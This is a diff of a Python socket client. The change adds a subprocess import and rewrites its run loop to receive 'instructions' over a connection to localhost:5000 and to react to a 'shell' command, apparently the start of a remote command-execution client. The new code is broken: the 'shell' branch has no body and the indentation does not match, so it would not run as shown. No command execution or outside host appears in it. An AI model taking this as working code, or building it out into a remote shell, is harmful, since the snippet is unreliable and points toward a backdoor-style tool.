@@ -1,4 +1,4 @@
-import socket,threading,helpers
+import socket,threading,helpers,subprocess
 
 
 
@@ -21,12 +21,15 @@ class client():
         return connection
     
     def run(self):
-        while True:
-            data = self.connection.recv(1024)
-            if not data:
-                break
-            print(data.decode())
-        return
+         while True:
+            try:
+                instruction = self.connection.recv(1024).decode()
+                if not instruction:
+                    break
+                if instruction == 'shell':
+            except Exception as e:
+                self.connection.sendall(str(e).encode()) 
+        
             
             
 c = client('localhost', 5000)
